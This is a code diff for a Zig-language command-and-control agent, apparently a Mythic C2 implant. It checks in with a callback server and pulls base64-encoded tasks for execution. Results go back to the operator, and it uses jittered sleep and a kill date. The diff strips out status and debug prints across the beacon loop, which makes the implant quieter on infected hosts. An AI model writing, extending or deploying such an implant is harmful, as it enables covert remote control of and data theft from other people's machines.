@@ -78,14 +78,9 @@ pub const MythicAgent = struct {
         
         try self.checkin();
         
-        print("[+] Agent started with UUID: {s}\n", .{self.uuid});
-        print("[+] Callback: {s}:{d}\n", .{ self.config.callback_host, self.config.callback_port });
-        print("[+] Sleep interval: {d}s (jitter: {d:.1}%)\n", .{ self.config.sleep_interval, self.config.jitter * 100 });
-        
         while (self.is_running) {
             if (self.config.kill_date) |kill_date| {
                 if (TimeUtils.isKillDateReached(kill_date)) {
-                    print("[!] Kill date reached, terminating agent\n", .{});
                     break;
                 }
             }
@@ -103,7 +98,6 @@ pub const MythicAgent = struct {
             self.sleep();
         }
         
-        print("[+] Agent terminated\n", .{});
     }
     
     fn checkin(self: *Self) !void {
@@ -154,7 +148,6 @@ pub const MythicAgent = struct {
         const response = try self.network_client.sendRequest("data", b64_data);
         defer self.allocator.free(response);
 
-        print("[DEBUG] Response: {s}\n", .{response});
 
         const decoded_len = base64.standard.Decoder.calcSizeForSlice(response) catch {
             print("[ERROR] Invalid Base64 response\n", .{});
@@ -167,14 +160,10 @@ pub const MythicAgent = struct {
             return error.InvalidBase64;
         };
 
-        print("[DEBUG] Decoded Response (UUID+JSON): {s}\n", .{decoded_response});
-
         if (response.len < 36) {
-            print("[ERROR] Response too short to contain CallbackUUID\n", .{});
             return error.InvalidResponse;
         }
         const json_response = decoded_response[36..];
-        print("[DEBUG] JSON Response to parse: {s}\n", .{json_response});
         const parsed = json.parseFromSlice(json.Value, self.allocator, json_response, .{}) catch |err| {
             print("[ERROR] Failed to parse checkin JSON: {}\n", .{err});
             return err;
@@ -182,12 +171,9 @@ pub const MythicAgent = struct {
         defer parsed.deinit();
         if (parsed.value.object.get("id")) |payload_uuid_value| {
             self.payload_uuid = try self.allocator.dupe(u8, payload_uuid_value.string);
-            print("[+] Payload UUID: {s}\n", .{self.payload_uuid});
         } else {
-            print("[!] No payload UUID in checkin response\n", .{});
             return error.InvalidResponse;
         }
-
 
         self.last_checkin = TimeUtils.getCurrentTimestamp();
     }
@@ -202,7 +188,6 @@ pub const MythicAgent = struct {
         defer json_buffer.deinit();
 
         try json.stringify(get_tasking_data, .{}, json_buffer.writer());
-        print("[DEBUG] Tasking request JSON: {s}\n", .{json_buffer.items});
 
         var combined = std.ArrayList(u8).init(self.allocator);
         defer combined.deinit();
@@ -215,12 +200,10 @@ pub const MythicAgent = struct {
         const b64_data = try self.allocator.alloc(u8, b64_len);
         defer self.allocator.free(b64_data);
         _ = encoder.encode(b64_data, combined.items);
-        print("[DEBUG] Base64 encoded tasking request: {s}\n", .{b64_data});
 
         const response = try self.network_client.sendRequest("data", b64_data);
         defer self.allocator.free(response);
         
-        print("[DEBUG] Response: {s}\n", .{response});
 
         const decoded_len = base64.standard.Decoder.calcSizeForSlice(response) catch {
             print("[ERROR] Invalid Base64 response\n", .{});
@@ -233,12 +216,8 @@ pub const MythicAgent = struct {
             print("[ERROR] Failed to decode Base64 response\n", .{});
             return error.InvalidBase64;
         };
-
-        print("[DEBUG] Decoded Response (UUID+JSON): {s}\n", .{decoded_response});
-
         
         if (response.len < 36) {
-            print("[ERROR] Response too short to contain CallbackUUID\n", .{});
             return error.InvalidResponse;
         }
         const Task = struct {
@@ -248,23 +227,12 @@ pub const MythicAgent = struct {
             parameters: json.Value,
         };
         const json_response = decoded_response[36..];
-        print("[DEBUG] JSON Response to parse: {s}\n", .{json_response});
         
         const parsed = json.parseFromSlice(struct { action: []const u8, tasks: []Task }, self.allocator, json_response, .{}) catch |err| {
             print("[ERROR] Failed to parse tasking JSON: {}\n", .{err});
             return err;
         };
         defer parsed.deinit();
-
-        print("[+] Received {d} tasks:\n", .{parsed.value.tasks.len});
-        for (parsed.value.tasks) |task| {
-            print("  Task ID: {s}, Command: {s}, Parameters: {}\n, Timestamp: {d}" , .{
-                task.id,
-                task.command,
-                task.parameters,
-                task.timestamp,
-            });
-        }
     
         try self.parseTaskResponse(json_response);
     }
@@ -286,7 +254,6 @@ pub const MythicAgent = struct {
                     };
                     
                     try self.tasks.append(task);
-                    print("[+] Received task: {s} - {s}\n", .{ task.command, task.id });
                 }
             }
         }
@@ -296,7 +263,6 @@ pub const MythicAgent = struct {
         for (self.tasks.items) |*task| {
             if (task.status == .submitted) {
                 task.status = .processing;
-                print("[*] Processing task: {s}\n", .{task.command});
                 
                 if (std.mem.eql(u8, task.command, "exit")) {
                     self.is_running = false;
@@ -371,20 +337,14 @@ pub const MythicAgent = struct {
         defer self.allocator.free(b64_data);
         _ = encoder.encode(b64_data, combined.items);
 
-        print("[DEBUG] Sending post_response with UUID {s}: {s}\n", .{ self.payload_uuid, json_buffer.items });
-        print("[DEBUG] Base64 encoded response: {s}\n", .{b64_data});
-
         const server_response = try self.network_client.sendRequest("data", b64_data);
         defer self.allocator.free(server_response);
-
-        print("[+] Sent {} responses in batch\n", .{self.pending_responses.items.len});
 
         self.pending_responses.clearAndFree();
     }
 
     fn sleep(self: *Self) void {
         const sleep_time = TimeUtils.calculateJitteredSleep(self.config.sleep_interval, self.config.jitter);
-        print("[*] Sleeping for {d} seconds...\n", .{sleep_time});
         TimeUtils.sleep(sleep_time);
     }
 };
